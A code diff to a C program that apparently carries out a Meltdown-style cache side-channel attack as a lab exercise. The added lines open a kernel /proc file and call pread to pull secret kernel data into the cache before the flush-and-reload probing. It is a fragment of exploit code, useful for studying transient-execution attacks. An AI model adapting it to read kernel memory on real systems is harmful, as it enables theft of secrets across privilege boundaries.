@@ -61,6 +61,13 @@ int main(int argc, char* argv[]) {
 	// register signal handler for seg fault
 	signal(SIGSEGV, catch_segv);
 
+	// open kernel /proc file
+	int fd = open("/proc/pic", O_RDONLY);
+	if(fd < 0) {
+		perror("Failed to open /proc file.\n");
+		return -1;
+	}	
+
 	/* Same technique as cache-time.c/flush-reload.c */
 
 	printf("%-12s %-12s %-12s %-12s %-12s\n", "Byte #", "Guess (char)", "Guess (int)", "Hits", "Total Iterations");
@@ -81,6 +88,9 @@ int main(int argc, char* argv[]) {
 				// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
 				_mm_clflush(&probe_array[i * PAGE_SIZE]);
 			}		
+			
+			// bring victim data into the cache
+			int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
 
 			// creates a checkpoint ; context is saved in sigjump_buf jbuf
 			if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
